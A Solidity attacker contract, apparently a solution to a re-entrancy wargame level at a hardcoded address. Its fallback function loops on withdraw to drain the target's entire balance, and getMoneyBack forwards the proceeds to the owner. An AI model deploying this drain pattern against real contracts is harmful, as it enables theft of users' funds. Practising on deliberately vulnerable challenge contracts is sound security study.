// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface ReEntranceLevel {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReEntranceContract {

    address private levelContractAddress = 0x22e2a29854640CB8A1c49a2Ee0D3a11b8400004c;
    address private owner;

    constructor() {
        owner = msg.sender;
    }

    function donate() payable external {
        ReEntranceLevel levelContract = ReEntranceLevel(levelContractAddress);
        levelContract.donate{value:0.001 ether}(address(this));
    }

    function withdraw() external {
        ReEntranceLevel levelContract = ReEntranceLevel(levelContractAddress);
        levelContract.withdraw(0.001 ether);
    }

    function getMoneyBack() external {
        owner.call{value : address(this).balance}("");
    }

    fallback() external payable {
        ReEntranceLevel levelContract = ReEntranceLevel(levelContractAddress);
        while (levelContractAddress.balance > 0)
        {
            levelContract.withdraw(0.001 ether);
        }
    }
}